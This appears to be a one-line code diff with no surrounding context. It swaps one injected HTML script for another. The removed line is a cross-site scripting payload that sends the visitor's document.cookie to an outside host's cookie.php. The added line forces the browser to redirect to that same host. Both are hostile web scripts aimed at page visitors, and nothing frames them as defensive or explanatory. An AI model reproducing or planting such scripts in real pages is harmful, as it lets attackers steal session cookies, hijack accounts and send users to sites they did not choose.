@@ -1,1 +1,1 @@
- <script>new Image().src="https://melvinrinkleff.dev/cookie.php?cookie="+document.cookie;</script>
+<script>window.location.href="https://melvinrinkleff.dev"</script>
